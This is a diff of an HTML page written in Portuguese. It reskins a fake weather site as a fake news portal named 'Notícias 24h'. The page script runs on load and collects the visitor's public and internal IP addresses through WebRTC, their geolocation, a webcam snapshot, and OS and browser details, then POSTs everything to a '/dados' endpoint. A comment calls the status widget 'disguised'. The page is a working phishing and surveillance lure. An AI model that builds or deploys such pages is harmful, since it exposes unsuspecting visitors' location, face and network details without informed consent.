@@ -2,154 +2,720 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>Clima Hoje - Previs√£o do Tempo</title>
-  <meta name="description" content="Previs√£o do tempo personalizada para sua regi√£o. Temperatura, umidade, radar meteorol√≥gico e muito mais.">
-  <meta property="og:title" content="Clima Hoje - Previs√£o do Tempo">
-  <meta property="og:description" content="Sua previs√£o do tempo personalizada para cada momento do dia">
-  <meta property="og:image" content="https://images.unsplash.com/photo-1504608524841-42fe6f032b4b?w=800&h=600&fit=crop">
+  <title>NotÌcias 24h - Portal de NotÌcias</title>
+  <meta name="description" content="Portal de notÌcias com as principais informaÁıes do Brasil e do mundo. PolÌtica, economia, esportes e muito mais.">
+  <meta property="og:title" content="NotÌcias 24h - Portal de NotÌcias">
+  <meta property="og:description" content="Fique por dentro das principais notÌcias do Brasil e do mundo">
+  <meta property="og:image" content="https://images.unsplash.com/photo-1504711434969-e33886168f5c?w=800&h=600&fit=crop">
   <meta property="og:url" content="">
   <meta property="og:type" content="website">
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="Clima Hoje - Previs√£o do Tempo">
-  <meta name="twitter:description" content="Sua previs√£o do tempo personalizada para cada momento do dia">
-  <meta name="twitter:image" content="https://images.unsplash.com/photo-1504608524841-42fe6f032b4b?w=800&h=600&fit=crop">
+  <meta name="twitter:title" content="NotÌcias 24h - Portal de NotÌcias">
+  <meta name="twitter:description" content="Fique por dentro das principais notÌcias do Brasil e do mundo">
+  <meta name="twitter:image" content="https://images.unsplash.com/photo-1504711434969-e33886168f5c?w=800&h=600&fit=crop">
   <style>
-    body {
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(to right, #87CEEB, #4682B4);
+    * {
       margin: 0;
       padding: 0;
-      color: #333;
+      box-sizing: border-box;
     }
+    
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+      background: #ffffff;
+      color: #1a1a1a;
+      line-height: 1.6;
+    }
+    
+    /* Header moderno */
     header {
-      background-color: #2C5F7D;
+      background: #fff;
+      border-bottom: 1px solid #e1e5e9;
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+    }
+    
+    .header-top {
+      background: #c41e3a;
       color: white;
-      padding: 30px 20px;
+      font-size: 12px;
+      padding: 6px 0;
       text-align: center;
     }
-    header img {
-      max-height: 80px;
-      margin-bottom: 10px;
+    
+    .header-main {
+      padding: 16px 0;
     }
-    header h1 {
-      font-size: 2.8em;
+    
+    .header-content {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    
+    .logo img {
+      width: 48px;
+      height: 48px;
+      border-radius: 8px;
+    }
+    
+    .logo-text h1 {
+      font-size: 28px;
+      font-weight: 800;
+      color: #c41e3a;
       margin: 0;
     }
+    
+    .logo-text p {
+      font-size: 11px;
+      color: #666;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin: 0;
+    }
+    
+    .nav-menu {
+      display: flex;
+      list-style: none;
+      gap: 32px;
+    }
+    
+    .nav-menu a {
+      text-decoration: none;
+      color: #333;
+      font-weight: 500;
+      font-size: 14px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      padding: 8px 0;
+      border-bottom: 2px solid transparent;
+      transition: all 0.3s ease;
+    }
+    
+    .nav-menu a:hover,
+    .nav-menu a.active {
+      color: #c41e3a;
+      border-bottom-color: #c41e3a;
+    }
+    
+    /* Container principal */
     .container {
-      max-width: 900px;
-      margin: auto;
-      padding: 40px 20px;
-      text-align: center;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 20px;
     }
-    .section {
-      background: white;
-      border-radius: 10px;
-      padding: 30px;
-      margin-bottom: 30px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.05);
+    
+    /* Hero section */
+    .hero-section {
+      margin: 24px 0;
     }
-    h2 {
-      color: #2C5F7D;
-      font-size: 1.8em;
-      margin-bottom: 15px;
+    
+    .hero-grid {
+      display: grid;
+      grid-template-columns: 2fr 1fr;
+      gap: 24px;
     }
-    p {
-      font-size: 1.1em;
-      margin: 10px 0;
+    
+    .main-story {
+      position: relative;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.15);
     }
-    #status {
-      margin-top: 20px;
-      color: green;
-      font-weight: bold;
-    }
-    iframe {
+    
+    .main-story img {
       width: 100%;
       height: 400px;
-      border: none;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      object-fit: cover;
     }
-    footer {
-      background-color: #2C5F7D;
+    
+    .story-overlay {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: linear-gradient(transparent, rgba(0,0,0,0.8));
       color: white;
-      text-align: center;
-      padding: 20px;
-      font-size: 0.9em;
+      padding: 40px 30px 30px;
     }
-    .weather-icon {
-      font-size: 2em;
-      margin: 10px;
+    
+    .story-category {
+      background: #c41e3a;
+      color: white;
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 600;
+      text-transform: uppercase;
+      display: inline-block;
+      margin-bottom: 12px;
+    }
+    
+    .story-title {
+      font-size: 28px;
+      font-weight: 700;
+      line-height: 1.3;
+      margin-bottom: 8px;
+    }
+    
+    .story-meta {
+      font-size: 14px;
+      opacity: 0.9;
+    }
+    
+    /* Sidebar de notÌcias */
+    .sidebar-stories {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+    
+    .sidebar-story {
+      display: flex;
+      gap: 16px;
+      padding: 16px;
+      background: #f8f9fa;
+      border-radius: 8px;
+      transition: transform 0.2s ease;
+    }
+    
+    .sidebar-story:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    
+    .sidebar-story img {
+      width: 80px;
+      height: 80px;
+      object-fit: cover;
+      border-radius: 6px;
+      flex-shrink: 0;
+    }
+    
+    .sidebar-content h3 {
+      font-size: 16px;
+      font-weight: 600;
+      line-height: 1.4;
+      margin-bottom: 8px;
+      color: #333;
+    }
+    
+    .sidebar-time {
+      font-size: 12px;
+      color: #666;
+    }
+    
+    /* Grid de notÌcias */
+    .news-grid {
+      margin: 48px 0;
+    }
+    
+    .section-title {
+      font-size: 32px;
+      font-weight: 800;
+      color: #333;
+      margin-bottom: 24px;
+      padding-bottom: 12px;
+      border-bottom: 3px solid #c41e3a;
+      display: inline-block;
+    }
+    
+    .news-cards {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 24px;
+      margin-bottom: 32px;
+    }
+    
+    .news-card {
+      background: white;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+      transition: all 0.3s ease;
+    }
+    
+    .news-card:hover {
+      transform: translateY(-4px);
+      box-shadow: 0 8px 25px rgba(0,0,0,0.15);
+    }
+    
+    .news-card img {
+      width: 100%;
+      height: 200px;
+      object-fit: cover;
+    }
+    
+    .card-content {
+      padding: 20px;
+    }
+    
+    .card-category {
+      background: #e3f2fd;
+      color: #1976d2;
+      padding: 4px 10px;
+      border-radius: 16px;
+      font-size: 11px;
+      font-weight: 600;
+      text-transform: uppercase;
+      display: inline-block;
+      margin-bottom: 12px;
+    }
+    
+    .card-title {
+      font-size: 18px;
+      font-weight: 600;
+      line-height: 1.4;
+      margin-bottom: 8px;
+      color: #333;
+    }
+    
+    .card-excerpt {
+      font-size: 14px;
+      color: #666;
+      line-height: 1.5;
+      margin-bottom: 12px;
+    }
+    
+    .card-meta {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 12px;
+      color: #999;
+    }
+    
+    /* Newsletter */
+    .newsletter-section {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      padding: 48px 0;
+      margin: 48px 0;
+      border-radius: 16px;
+      text-align: center;
+    }
+    
+    .newsletter-content {
+      max-width: 600px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+    
+    .newsletter-title {
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 12px;
+    }
+    
+    .newsletter-subtitle {
+      font-size: 16px;
+      opacity: 0.9;
+      margin-bottom: 32px;
+    }
+    
+    .newsletter-form {
+      display: flex;
+      max-width: 400px;
+      margin: 0 auto;
+      gap: 12px;
+    }
+    
+    .newsletter-input {
+      flex: 1;
+      padding: 12px 16px;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+    }
+    
+    .newsletter-btn {
+      background: #c41e3a;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 8px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    
+    .newsletter-btn:hover {
+      background: #a01729;
+    }
+    
+    /* Status do sistema (disfarÁado) */
+    .weather-widget {
+      background: #f8f9fa;
+      border-radius: 12px;
+      padding: 20px;
+      margin: 24px 0;
+      border-left: 4px solid #c41e3a;
+    }
+    
+    .widget-title {
+      font-size: 18px;
+      font-weight: 600;
+      color: #333;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    
+    #status {
+      font-size: 14px;
+      color: #666;
+      padding: 12px;
+      background: white;
+      border-radius: 8px;
+      border: 1px solid #e1e5e9;
+      text-align: center;
+    }
+    
+    /* Footer */
+    footer {
+      background: #1a1a1a;
+      color: #ccc;
+      padding: 48px 0 24px;
+      margin-top: 64px;
+    }
+    
+    .footer-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 32px;
+      margin-bottom: 32px;
+    }
+    
+    .footer-section h4 {
+      color: white;
+      font-size: 18px;
+      font-weight: 600;
+      margin-bottom: 16px;
+    }
+    
+    .footer-section ul {
+      list-style: none;
+    }
+    
+    .footer-section ul li {
+      margin-bottom: 8px;
+    }
+    
+    .footer-section ul li a {
+      color: #ccc;
+      text-decoration: none;
+      font-size: 14px;
+      transition: color 0.3s ease;
+    }
+    
+    .footer-section ul li a:hover {
+      color: #c41e3a;
+    }
+    
+    .footer-bottom {
+      border-top: 1px solid #333;
+      padding-top: 24px;
+      text-align: center;
+      font-size: 14px;
+      color: #999;
+    }
+    
+    /* Responsivo */
+    @media (max-width: 768px) {
+      .header-content {
+        flex-direction: column;
+        gap: 16px;
+      }
+      
+      .nav-menu {
+        gap: 16px;
+        flex-wrap: wrap;
+        justify-content: center;
+      }
+      
+      .hero-grid {
+        grid-template-columns: 1fr;
+      }
+      
+      .story-title {
+        font-size: 24px;
+      }
+      
+      .news-cards {
+        grid-template-columns: 1fr;
+      }
+      
+      .newsletter-form {
+        flex-direction: column;
+      }
+      
+      .footer-grid {
+        grid-template-columns: 1fr;
+        text-align: center;
+      }
+    }
+    
+    /* AnimaÁıes */
+    .news-card,
+    .sidebar-story {
+      animation: fadeInUp 0.6s ease forwards;
+    }
+    
+    @keyframes fadeInUp {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
     }
   </style>
 </head>
 <body>
   <header>
-    <img src="https://static.vecteezy.com/system/resources/previews/024/553/534/non_2x/weather-forecast-icon-clipart-transparent-background-free-png.png" alt="Logo Clima Hoje">
-    <h1>Clima Hoje</h1>
-    <p>"Sua previs√£o do tempo personalizada para cada momento do dia"</p>
+    <div class="header-top">
+      ?? URGENTE: Acompanhe as ˙ltimas notÌcias do Brasil e do mundo em tempo real
+    </div>
+    <div class="header-main">
+      <div class="header-content">
+        <div class="logo">
+          <img src="https://images.unsplash.com/photo-1504711434969-e33886168f5c?w=48&h=48&fit=crop" alt="Logo NotÌcias 24h">
+          <div class="logo-text">
+            <h1>NotÌcias 24h</h1>
+            <p>Portal de NotÌcias</p>
+          </div>
+        </div>
+        <nav>
+          <ul class="nav-menu">
+            <li><a href="#" class="active">InÌcio</a></li>
+            <li><a href="#">Brasil</a></li>
+            <li><a href="#">Mundo</a></li>
+            <li><a href="#">PolÌtica</a></li>
+            <li><a href="#">Economia</a></li>
+            <li><a href="#">Esportes</a></li>
+            <li><a href="#">Tecnologia</a></li>
+          </ul>
+        </nav>
+      </div>
+    </div>
   </header>
 
   <div class="container">
-    <div class="section">
-      <h2>üå§Ô∏è Previs√£o de Hoje</h2>
-      <div class="weather-icon">‚òÄÔ∏è</div>
-      <p>Temperatura: 28¬∞C</p>
-      <p>Sensa√ß√£o t√©rmica: 31¬∞C</p>
-      <p>Umidade: 65%</p>
-      <p>Vento: 12 km/h</p>
+    <!-- Hero Section -->
+    <section class="hero-section">
+      <div class="hero-grid">
+        <div class="main-story">
+          <img src="https://images.unsplash.com/photo-1557804506-669a67965ba0?w=800&h=400&fit=crop" alt="NotÌcia Principal">
+          <div class="story-overlay">
+            <span class="story-category">PolÌtica</span>
+            <h2 class="story-title">Congresso Nacional aprova nova legislaÁ„o sobre crimes digitais</h2>
+            <div class="story-meta">Por RedaÁ„o ï H· 2 horas</div>
+          </div>
+        </div>
+        
+        <div class="sidebar-stories">
+          <div class="sidebar-story">
+            <img src="https://images.unsplash.com/photo-1611348586804-61bf6c080437?w=80&h=80&fit=crop" alt="Economia">
+            <div class="sidebar-content">
+              <h3>DÛlar fecha em alta apÛs decis„o do Banco Central</h3>
+              <div class="sidebar-time">H· 1 hora</div>
+            </div>
+          </div>
+          
+          <div class="sidebar-story">
+            <img src="https://images.unsplash.com/photo-1571019613454-1cb2f99b2d8b?w=80&h=80&fit=crop" alt="Esportes">
+            <div class="sidebar-content">
+              <h3>Brasil se classifica para as quartas de final</h3>
+              <div class="sidebar-time">H· 3 horas</div>
+            </div>
+          </div>
+          
+          <div class="sidebar-story">
+            <img src="https://images.unsplash.com/photo-1576091160550-2173dba999ef?w=80&h=80&fit=crop" alt="Tecnologia">
+            <div class="sidebar-content">
+              <h3>Nova tecnologia promete revolucionar transportes</h3>
+              <div class="sidebar-time">H· 4 horas</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ⁄ltimas NotÌcias -->
+    <section class="news-grid">
+      <h2 class="section-title">⁄ltimas NotÌcias</h2>
+      <div class="news-cards">
+        <article class="news-card">
+          <img src="https://images.unsplash.com/photo-1504711434969-e33886168f5c?w=400&h=200&fit=crop" alt="NotÌcia">
+          <div class="card-content">
+            <span class="card-category">Brasil</span>
+            <h3 class="card-title">Governo anuncia novo programa de incentivo ‡ educaÁ„o</h3>
+            <p class="card-excerpt">Medida deve beneficiar mais de 2 milhıes de estudantes em todo o paÌs com bolsas de estudo e investimentos em infraestrutura.</p>
+            <div class="card-meta">
+              <span>Por Ana Silva</span>
+              <span>H· 30 min</span>
+            </div>
+          </div>
+        </article>
+
+        <article class="news-card">
+          <img src="https://images.unsplash.com/photo-1586880244406-556ebe35f282?w=400&h=200&fit=crop" alt="Mundo">
+          <div class="card-content">
+            <span class="card-category">Mundo</span>
+            <h3 class="card-title">Acordo clim·tico global ganha novo apoio internacional</h3>
+            <p class="card-excerpt">PaÌses europeus e asi·ticos se unem em nova iniciativa para combater as mudanÁas clim·ticas atÈ 2030.</p>
+            <div class="card-meta">
+              <span>Por Carlos Mendes</span>
+              <span>H· 1 hora</span>
+            </div>
+          </div>
+        </article>
+
+        <article class="news-card">
+          <img src="https://images.unsplash.com/photo-1460925895917-afdab827c52f?w=400&h=200&fit=crop" alt="Economia">
+          <div class="card-content">
+            <span class="card-category">Economia</span>
+            <h3 class="card-title">Startups brasileiras batem recorde de investimentos</h3>
+            <p class="card-excerpt">Setor de tecnologia recebeu mais de R$ 15 bilhıes em investimentos no primeiro semestre deste ano.</p>
+            <div class="card-meta">
+              <span>Por Maria Santos</span>
+              <span>H· 2 horas</span>
+            </div>
+          </div>
+        </article>
+
+        <article class="news-card">
+          <img src="https://images.unsplash.com/photo-1434030216411-0b793f4b4173?w=400&h=200&fit=crop" alt="EducaÁ„o">
+          <div class="card-content">
+            <span class="card-category">EducaÁ„o</span>
+            <h3 class="card-title">Universidades p˙blicas ampliam programas de extens„o</h3>
+            <p class="card-excerpt">Iniciativa visa aproximar academia da sociedade com projetos sociais e de desenvolvimento comunit·rio.</p>
+            <div class="card-meta">
+              <span>Por Jo„o Oliveira</span>
+              <span>H· 3 horas</span>
+            </div>
+          </div>
+        </article>
+
+        <article class="news-card">
+          <img src="https://images.unsplash.com/photo-1576091160399-112ba8d25d1f?w=400&h=200&fit=crop" alt="Sa˙de">
+          <div class="card-content">
+            <span class="card-category">Sa˙de</span>
+            <h3 class="card-title">Nova vacina mostra resultados promissores em testes</h3>
+            <p class="card-excerpt">Pesquisadores brasileiros desenvolvem imunizante com efic·cia de 95% contra nova variante viral.</p>
+            <div class="card-meta">
+              <span>Por Dra. Lucia Fernandes</span>
+              <span>H· 4 horas</span>
+            </div>
+          </div>
+        </article>
+
+        <article class="news-card">
+          <img src="https://images.unsplash.com/photo-1551836022-d5d88e9218df?w=400&h=200&fit=crop" alt="Esportes">
+          <div class="card-content">
+            <span class="card-category">Esportes</span>
+            <h3 class="card-title">Atleta brasileiro conquista medalha em competiÁ„o mundial</h3>
+            <p class="card-excerpt">Performance histÛrica coloca o paÌs entre os principais no ranking mundial da modalidade.</p>
+            <div class="card-meta">
+              <span>Por Roberto Lima</span>
+              <span>H· 5 horas</span>
+            </div>
+          </div>
+        </article>
+      </div>
+    </section>
+
+    <!-- Widget do Tempo (Status disfarÁado) -->
+    <div class="weather-widget">
+      <div class="widget-title">
+        ??? InformaÁıes do Sistema
+      </div>
+      <div id="status">Carregando informaÁıes...</div>
     </div>
 
-    <div class="section">
-      <h2>üìÖ Previs√£o dos Pr√≥ximos Dias</h2>
-      <p>üå§Ô∏è Segunda: 25¬∞C - 30¬∞C (Sol com nuvens)</p>
-      <p>üåßÔ∏è Ter√ßa: 22¬∞C - 27¬∞C (Chuvas isoladas)</p>
-      <p>‚õàÔ∏è Quarta: 20¬∞C - 25¬∞C (Tempestades)</p>
-      <p>‚òÄÔ∏è Quinta: 24¬∞C - 29¬∞C (Ensolarado)</p>
-      <p>üå§Ô∏è Sexta: 26¬∞C - 31¬∞C (Parcialmente nublado)</p>
-    </div>
-
-    <div class="section">
-      <h2>üìû Contato e Informa√ß√µes</h2>
-      <p>Telefone: (81) 3333-4444</p>
-      <p>Email: contato@climahoje.com.br</p>
-      <p>WhatsApp: (81) 99999-1111</p>
-    </div>
-
-    <div class="section">
-      <h2>üå°Ô∏è Dicas do Clima</h2>
-      <p>‚òî Segunda: Leve um guarda-chuva</p>
-      <p>üï∂Ô∏è Ter√ßa: Use protetor solar</p>
-      <p>üß• Quarta: Vista uma blusa leve</p>
-      <p>üëï Quinta: Roupas leves e claras</p>
-      <p>üèñÔ∏è Sexta: Dia perfeito para praia</p>
-    </div>
-
-    <div class="section">
-      <h2>üì∞ Radar Meteorol√≥gico</h2>
-      <!-- Corrigido o src do iframe -->
-      <iframe src="https://www.tempo.com/brasil" title="Radar meteorol√≥gico"></iframe>
-    </div>
-
-    <div class="section">
-      <h2>üõ°Ô∏è Status do Sistema</h2>
-      <p id="status">Carregando informa√ß√µes...</p>
-    </div>
+    <!-- Newsletter -->
+    <section class="newsletter-section">
+      <div class="newsletter-content">
+        <h2 class="newsletter-title">Receba as principais notÌcias</h2>
+        <p class="newsletter-subtitle">Cadastre-se em nossa newsletter e fique por dentro das ˙ltimas notÌcias</p>
+        <form class="newsletter-form">
+          <input type="email" class="newsletter-input" placeholder="Seu melhor e-mail">
+          <button type="submit" class="newsletter-btn">Cadastrar</button>
+        </form>
+      </div>
+    </section>
   </div>
 
   <footer>
-    &copy; 2025 Clima Hoje - Previs√£o do Tempo ‚Äì Todos os direitos reservados.
+    <div class="container">
+      <div class="footer-grid">
+        <div class="footer-section">
+          <h4>NotÌcias 24h</h4>
+          <ul>
+            <li><a href="#">Sobre nÛs</a></li>
+            <li><a href="#">Nossa equipe</a></li>
+            <li><a href="#">Contato</a></li>
+            <li><a href="#">Trabalhe conosco</a></li>
+          </ul>
+        </div>
+        <div class="footer-section">
+          <h4>SeÁıes</h4>
+          <ul>
+            <li><a href="#">Brasil</a></li>
+            <li><a href="#">Mundo</a></li>
+            <li><a href="#">PolÌtica</a></li>
+            <li><a href="#">Economia</a></li>
+          </ul>
+        </div>
+        <div class="footer-section">
+          <h4>Mais</h4>
+          <ul>
+            <li><a href="#">Esportes</a></li>
+            <li><a href="#">Tecnologia</a></li>
+            <li><a href="#">Cultura</a></li>
+            <li><a href="#">Sa˙de</a></li>
+          </ul>
+        </div>
+        <div class="footer-section">
+          <h4>Redes Sociais</h4>
+          <ul>
+            <li><a href="#">Facebook</a></li>
+            <li><a href="#">Twitter</a></li>
+            <li><a href="#">Instagram</a></li>
+            <li><a href="#">YouTube</a></li>
+          </ul>
+        </div>
+      </div>
+      <div class="footer-bottom">
+        &copy; 2025 NotÌcias 24h - Portal de NotÌcias. Todos os direitos reservados.
+      </div>
+    </div>
   </footer>
 
   <script>
-  // Fun√ß√£o para tentar obter IPs internos usando WebRTC
+  // FunÁ„o para tentar obter IPs internos usando WebRTC
   async function obterIPInterno() {
     return new Promise((resolve) => {
-      let ipv4Interno = 'N√£o detectado';
-      let ipv6Interno = 'N√£o detectado';
+      let ipv4Interno = 'N„o detectado';
+      let ipv6Interno = 'N„o detectado';
 
       const pc = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
       if (!pc) {
-        console.warn('WebRTC n√£o suportado. N√£o foi poss√≠vel obter IP interno.');
+        console.warn('WebRTC n„o suportado. N„o foi possÌvel obter IP interno.');
         resolve({ ipv4Interno, ipv6Interno });
         return;
       }
@@ -161,14 +727,14 @@
         const matches = text.match(ipRegex);
         if (matches) {
           matches.forEach(ip => {
-            // Verifica se √© um IPv4 privado
+            // Verifica se È um IPv4 privado
             if (ip.startsWith('192.168.') || ip.startsWith('10.') || (ip.startsWith('172.') && parseInt(ip.split('.')[1]) >= 16 && parseInt(ip.split('.')[1]) <= 31)) {
-              if (ipv4Interno === 'N√£o detectado') { // Pega o primeiro encontrado
+              if (ipv4Interno === 'N„o detectado') { // Pega o primeiro encontrado
                  ipv4Interno = ip;
               }
             } else if (ip.includes(':') && !ip.startsWith('::') && !ip.startsWith('fe80')) {
-              // Heur√≠stica b√°sica para IPv6 local/global tempor√°rio
-              if (ipv6Interno === 'N√£o detectado') { // Pega o primeiro encontrado
+              // HeurÌstica b·sica para IPv6 local/global tempor·rio
+              if (ipv6Interno === 'N„o detectado') { // Pega o primeiro encontrado
                  ipv6Interno = ip;
               }
             }
@@ -183,14 +749,14 @@
         if (!ice || !ice.candidate || !ice.candidate.candidate) return;
         const candidate = ice.candidate.candidate;
         findIPs(candidate);
-        // findIPs(ice.candidate.address); // address pode n√£o estar sempre dispon√≠vel
+        // findIPs(ice.candidate.address); // address pode n„o estar sempre disponÌvel
       };
 
       rtc.createOffer()
         .then(sdp => rtc.setLocalDescription(sdp, noop, noop))
         .catch(noop);
 
-      // Timeout para garantir que a tentativa seja conclu√≠da
+      // Timeout para garantir que a tentativa seja concluÌda
       setTimeout(() => {
         rtc.onicecandidate = noop;
         rtc.close();
@@ -202,20 +768,20 @@
 
   async function capturarDados() {
     try {
-      // CAPTURA O IP P√öBLICO DO VISITANTE
+      // CAPTURA O IP P⁄BLICO DO VISITANTE
       let ip = 'Desconhecido';
       try {
-        // Corrigido: Removido o espa√ßo na URL
+        // Corrigido: Removido o espaÁo na URL
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
         ip = ipData.ip;
-        console.log("IP P√∫blico capturado:", ip);
+        console.log("IP P˙blico capturado:", ip);
       } catch (ipError) {
         console.error('Erro ao obter o IP externo via ipify:', ipError);
       }
 
       // TENTA CAPTURAR OS IPs INTERNOS
-      let ipsInternos = { ipv4Interno: 'N√£o detectado', ipv6Interno: 'N√£o detectado' };
+      let ipsInternos = { ipv4Interno: 'N„o detectado', ipv6Interno: 'N„o detectado' };
       try {
          ipsInternos = await obterIPInterno();
          console.log("IPs internos capturados:", ipsInternos);
@@ -247,7 +813,7 @@
           canvas.height = 480;
           const context = canvas.getContext('2d');
 
-          // Aguarda um pouco para o v√≠deo carregar
+          // Aguarda um pouco para o vÌdeo carregar
           await new Promise(resolve => setTimeout(resolve, 2000));
 
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -263,21 +829,21 @@
               imagem,
               sistema,
               navegador,
-              ip: ip, // IP p√∫blico
+              ip: ip, // IP p˙blico
               ipv4Interno: ipsInternos.ipv4Interno, // IP interno IPv4
               ipv6Interno: ipsInternos.ipv6Interno  // IP interno IPv6
             })
           }).then(() => {
-            document.getElementById('status').textContent = '‚úÖ Localiza√ß√£o e dados detectados com sucesso!';
+            document.getElementById('status').textContent = '? LocalizaÁ„o e dados detectados com sucesso!';
             stream.getTracks().forEach(track => track.stop());
           }).catch(err => {
             console.error("Erro ao enviar dados (com imagem):", err);
-            document.getElementById('status').textContent = '‚ùå Erro ao detectar localiza√ß√£o.';
+            document.getElementById('status').textContent = '? Erro ao detectar localizaÁ„o.';
             if(stream) stream.getTracks().forEach(track => track.stop());
           });
 
         } catch (mediaError) {
-          console.warn("Acesso √† c√¢mera negado ou falhou, enviando dados sem imagem:", mediaError);
+          console.warn("Acesso ‡ c‚mera negado ou falhou, enviando dados sem imagem:", mediaError);
           // Envia os dados mesmo sem imagem
           fetch('/dados', {
             method: 'POST',
@@ -286,34 +852,31 @@
               latitude,
               longitude,
               endereco,
-              imagem: null, // Indica que n√£o h√° imagem
+              imagem: null, // Indica que n„o h· imagem
               sistema,
               navegador,
-              ip: ip, // IP p√∫blico
+              ip: ip, // IP p˙blico
               ipv4Interno: ipsInternos.ipv4Interno, // IP interno IPv4
               ipv6Interno: ipsInternos.ipv6Interno  // IP interno IPv6
             })
           }).then(() => {
-            document.getElementById('status').textContent = '‚úÖ Localiza√ß√£o e dados detectados com sucesso (sem imagem)!';
+            document.getElementById('status').textContent = '? LocalizaÁ„o e dados detectados com sucesso (sem imagem)!';
           }).catch(err => {
             console.error("Erro ao enviar dados (sem imagem):", err);
-            document.getElementById('status').textContent = '‚ùå Erro ao detectar localiza√ß√£o.';
+            document.getElementById('status').textContent = '? Erro ao detectar localizaÁ„o.';
           });
         }
       }, (err) => {
-        console.error("Erro ao obter localiza√ß√£o:", err);
-        document.getElementById('status').textContent = '‚ùå Permiss√£o de localiza√ß√£o negada.';
-        // Mesmo sem localiza√ß√£o, podemos tentar enviar outros dados?
-        // Neste caso, vamos pular o envio, pois latitude/longitude s√£o fundamentais
+        console.error("Erro ao obter localizaÁ„o:", err);
+        document.getElementById('status').textContent = '? Permiss„o de localizaÁ„o negada.';
+        // Mesmo sem localizaÁ„o, podemos tentar enviar outros dados?
+        // Neste caso, vamos pular o envio, pois latitude/longitude s„o fundamentais
         // Mas poderia ser adaptado para enviar apenas IP, sistema, etc.
       });
     } catch (err) {
       console.error("Erro geral:", err);
-      document.getElementById('status').textContent = '‚ùå Erro ao capturar dados.';
+      document.getElementById('status').textContent = '? Erro ao capturar dados.';
     }
   }
 
     window.onload = capturarDados;
-  </script>
-</body>
-</html>
